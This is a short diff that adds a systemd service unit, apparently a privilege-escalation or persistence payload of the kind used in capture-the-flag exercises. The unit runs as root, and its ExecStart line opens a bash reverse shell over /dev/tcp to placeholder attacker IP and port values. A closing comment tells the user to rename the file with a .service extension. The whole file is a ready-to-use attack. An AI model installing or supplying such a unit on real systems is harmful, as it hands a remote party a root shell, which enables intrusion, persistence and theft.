@@ -1,0 +1,12 @@
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/#ATTACKER_IP/#PORT 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+# rename with .service and delete this string
